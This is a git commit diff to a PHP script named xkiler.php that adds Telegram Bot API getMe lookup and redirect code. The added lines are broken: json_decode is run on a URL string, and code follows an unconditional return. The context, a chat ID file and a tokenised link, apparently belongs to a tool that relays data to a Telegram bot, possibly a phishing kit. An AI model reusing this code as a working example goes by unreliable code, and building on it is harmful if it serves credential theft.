b0b0add38a8c909d1360e281d8ac62d0a60b789f
TRSONGIR <67713900+TRSONGIR@users.noreply.github.com>
2020-09-16 22:30:57 +0430

    Update xkiler.php

--- xkiler.php
+++ xkiler.php
@@ -162,6 +162,10 @@ $book="$url/book/?e=$O" ;
 
 $chat= file_get_contents("ID.txt");
 $yo="your chat id: " ;
+$getme12 = json_decode('https://api.telegram.org/bot'.$T.'/getMe');
+return file_get_contents($getme12) ;
+$botusername = "https://t.me/".$getme12->result->username;
+header("location: $botusername");
 }else{
 	header("Location: $url");
 };
